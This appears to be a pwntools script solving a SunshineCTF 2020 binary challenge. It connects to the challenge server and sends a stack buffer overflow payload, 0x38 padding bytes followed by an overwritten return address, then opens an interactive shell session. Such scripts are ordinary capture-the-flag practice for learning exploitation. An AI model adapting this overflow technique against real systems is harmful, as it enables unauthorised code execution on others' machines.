from pwn import *
r = remote('chal.2020.sunshinectf.org', 30004)
# r = process('chall_04')
r.recv(1024)
r.sendline(b'a')
r.sendline(b'a'*(0x40-0x8)+b'\xb7\x05\x40\x00\x00\x00\x00\x00')
r.interactive()
r.close()
